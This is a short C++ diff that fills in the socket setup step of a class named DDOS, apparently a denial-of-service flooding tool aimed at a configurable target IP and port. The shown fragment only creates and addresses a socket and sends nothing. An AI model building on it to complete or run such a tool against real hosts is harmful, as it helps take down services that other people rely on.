@@ -14,8 +14,15 @@ bool DDOS::isIPv4() {
 }
 
 void DDOS::goSocket() {
-  // TODO:
-  // Send a socket.
+  SOCKADDR_IN sin;
+  SOCKET sock = socket(AF_INET, this->protocol, 0);
+  if(sock == INVALID_SOCKET) {
+      cout << "er socket" << endl;
+      exit(1);
+  }
+  sin.sin_addr.s_addr = inet_addr(this->target);
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons(this->port);
 }
 
 void DDOS::attack() {
